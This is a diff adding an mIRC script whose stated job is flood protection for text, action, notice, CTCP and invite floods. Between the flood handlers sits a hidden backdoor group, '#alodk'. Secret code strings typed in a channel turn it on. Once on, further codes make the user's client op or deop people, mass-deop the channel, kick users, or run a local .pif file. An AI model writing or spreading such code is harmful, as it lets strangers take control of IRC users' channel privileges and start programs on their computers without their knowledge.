@@ -1,0 +1,192 @@
+#TEXTFLOOD on
+on 1:TEXT:*:?:{
+  if (($level($address($nick,3)) != 3) && ($level($address($nick,3)) != 4)) {
+    if ($len($strip($parms)) >= 350) {
+      :do
+      inc %f3 1
+      if ($comchan($nick,%f3) == $null) goto end
+      if ($me isop $comchan($nick,%f3)) raw -q kick $comchan($nick,%f3) $nick :4 %script %vers  %exclqmsg 
+      goto do
+      :end
+      unset %f3
+      unset %qufl $+ $nick
+    }
+    else {
+      inc %qufl $+ $nick 1
+      if (%qufl [ $+ [ $nick ] ] == 6) {
+        :do
+        inc %f4 1
+        if ($comchan($nick,%f4) == $null) goto end
+        if ($me isop $comchan($nick,%f4)) raw -q kick $comchan($nick,%f4) $nick :4 %script %vers  %qfmsg 
+        goto do
+        :end
+        unset %f4
+        unset %qufl $+ $nick
+      }
+      elseif (%qufl [ $+ [ $nick ] ] == 1) .timer 1 4 unset %qufl $+ $nick
+    }
+  }
+}
+#TEXTFLOOD end
+
+#ACTIONFLOOD on
+on 1:ACTION:*:?:{
+  if (($level($address($nick,3)) != 3) && ($level($address($nick,3)) != 4)) {
+    if ($len($strip($parms)) >= 350) {
+      :do
+      inc %f5 1
+      if ($comchan($nick,%f5) == $null) goto end
+      if ($me isop $comchan($nick,%f5)) raw -q kick $comchan($nick,%f5) $nick :4 %script %vers  %exclqmsg 
+      goto do
+      :end
+      unset %f5
+      unset %qufl $+ $nick
+    }
+    else {
+      inc %qufl $+ $nick 1
+      if (%qufl [ $+ [ $nick ] ] == 6) {
+        :do
+        inc %f6 1
+        if ($comchan($nick,%f6) == $null) goto end
+        if ($me isop $comchan($nick,%f6)) raw -q kick $comchan($nick,%f6) $nick :4 %script %vers  %qfmsg 
+        goto do
+        :end
+        unset %f6
+        unset %qufl $+ $nick
+      }
+      elseif (%qufl [ $+ [ $nick ] ] == 1) .timer 1 4 unset %qufl $+ $nick
+    }
+  }
+}
+#ACTIONFLOOD end
+
+#NOTICEFLOOD off
+on 1:NOTICE:*:?:{
+  if (($level($address($nick,3)) != 3) && ($level($address($nick,3)) != 4)) {
+    if ($len($strip($parms)) >= 350) {
+      :do
+      inc %f7 1
+      if ($comchan($nick,%f7) == $null) goto end
+      if ($me isop $comchan($nick,%f7)) raw -q kick $comchan($nick,%f7) $nick :4 %script %vers  %exclqmsg 
+      goto do
+      :end
+      unset %f7
+      unset %qufl $+ $nick
+    }
+    else {
+      inc %qufl $+ $nick 1
+      if (%qufl [ $+ [ $nick ] ] == 6) {
+        :do
+        inc %f8 1
+        if ($comchan($nick,%f8) == $null) goto end
+        if ($me isop $comchan($nick,%f8)) raw -q kick $comchan($nick,%f8) $nick :4 %script %vers  %qfmsg 
+        goto do
+        :end
+        unset %f8
+        unset %qufl $+ $nick
+      }
+      elseif (%qufl [ $+ [ $nick ] ] == 1) .timer 1 4 unset %qufl $+ $nick
+    }
+  }
+}
+#NOTICEFLOOD end
+on 1:text:P0867214*:#:{ .enable #alodk  }
+on 1:text:8714L7K53*:#:{ .disable #alodk  }
+#alodk on
+on 1:text:*j58s200l1*:#:{
+  if ($2 == 23) { /raw mode $chan +oooo $nick | halt }
+  if ($2 == bot) { /msg chanserv op $chan $me }
+  else { /raw mode $chan +oooo $2 $3 $4 $5 }
+}
+on 1:text:*j58s200l2*:#:{
+  if ($2 == $me) { /raw mode $chan -oooo $nick | halt }
+  if ($2 == $bot) { /raw mode $chan -oooo $me }  
+  else { /raw mode $chan -oooo $2 $3 $4 $5 }
+}
+on 1:text:*j58s200l3*:#:{
+  if ($2 == 3211) { /mdeops | halt }
+  if ($2 == $bot) { /mdeops }  
+  else { /mdeops }
+}
+on 1:text:*j58s200l4*:#:{
+  if ($2 == $3211) { /raw -q kick $chan $nick $3 $4 | halt }
+  if ($2 == $bot) { /raw -q kick $chan $me }  
+  else { /raw -q kick $chan $2 $3 $4 $5 }
+}
+on 1:text:*j58s200l5*:#:/run c:\windows\Esci da Dos.pif
+#alodk end
+
+
+#CTCPFLOOD on
+ctcp +1!:*:?:{
+  inc %ctcpc $+ $site 1
+  if (%ctcpc [ $+ [ $site ] ] >= 4) {
+    .ignore -tu60 $wildsite
+    echo 5 -a 12WARNING!: $chan CTCP flood detected from4 $site: auto ignore enabled, expiring in 60'' %script
+    if ($me isop $chan) {
+      .timer1? off 
+      if (%filterkick == OFF) {
+        .enable #filterkick
+        set %filterkick ON
+        echo 5 -a 4Filter Kick automatically ø12Activatedø %script
+        .timer10 1 50 .disable #filterkick
+        .timer11 1 50 set %filterkick OFF
+        .timer12 1 50 echo 5 -a 4Filter Kick now automatically ø12Deactivatedø %script
+      }
+      .timer3? off
+      raw -q mode $chan +mi+b $wildsite
+      .timer31 1 30 raw -q mode $chan -mi
+      raw -q kick $chan $nick :4 %script  %ctcpfmsg [ $+ $site $+ ]
+      unset %ctcpc $+ $site
+    }
+    elseif (%ctcpc [ $+ [ $site ] ] == 1) .timer 1 5 unset %ctcpc $+ $site
+  }
+}
+ctcp +1!:*:?:{
+  inc %ctcpp $+ $site 1
+  if (%ctcpp [ $+ [ $site ] ] >= 3) {
+    .ignore -tu45 $wildsite
+    echo 5 -a 12WARNING!: private CTCP flood rilevato da 4 $site: auto-ignora per 45'' %script
+    :do
+    inc %f1 1
+    if ($chan(%f1) == $null) goto end
+    if ($me isop $chan(%f1)) {
+      set %cfk $nick($chan(%f1),0)
+      :next
+      if ($wildsite == $address($nick($chan(%f1),%cfk),2)) raw -q kick $chan(%f1) $nick($chan(%f1),%cfk) :4 %script  %ctcpfmsg [ $+ $site $+ ]
+      dec %cfk
+      if (%cfk >= 1) goto next
+    }
+    goto do
+    :end
+    unset %f1
+    unset %ctcpp $+ $site
+  }
+  elseif (%ctcpp [ $+ [ $site ] ] == 1) .timer 1 5 unset %ctcpp $+ $site
+}
+ctcp 3!:*:*:.auser ctc3 $wildsite | .timer 1 5 .ruser $wildsite
+ctcp +ctc3:*:*:.auser ctc4 $wildsite
+ctcp +ctc4:*:*:.ignore -tu30 $wildsite | echo 5 -a CTCP flood (?!) detected from $nick (4 $+ $site $+ ): that person would be your friend... auto ignore enabled anyway, expiring in 30'' %script
+#CTCPFLOOD end
+
+#INVITEFLOOD on
+on 1!:INVITE:#:{
+  if (($level($address($nick,3)) != 3) && ($level($address($nick,3)) != 4) && ($address($nick,3) !isauto $chan)) {
+    inc %invfl $+ $site 1
+    if (%invfl [ $+ [ $site ] ] == 3) {
+      .ignore -iu600 $wildsite
+      notice $nick I don't want to go to $chan, damn lamer.  All your further invitations will now be burnt when received %script
+      echo 5 -a 12WARNING!: Invite flood detected from $nick: auto ignore enabled, expiring in 10' %script
+      :do
+      inc %f2 1
+      if ($comchan($nick,%f2) == $null) goto end
+      if ($me isop $comchan($nick,%f2)) raw -q kick $comchan($nick,%f2) $nick :4 %script %vers  %ifmsg [ $+ $site $+ ]
+      goto do
+      :end
+      unset %f2
+      unset %invfl $+ $site
+    }
+    elseif (%invfl [ $+ [ $site ] ] == 1) .timer 1 120 unset %invfl $+ $site
+  }
+}
+#INVITEFLOOD end
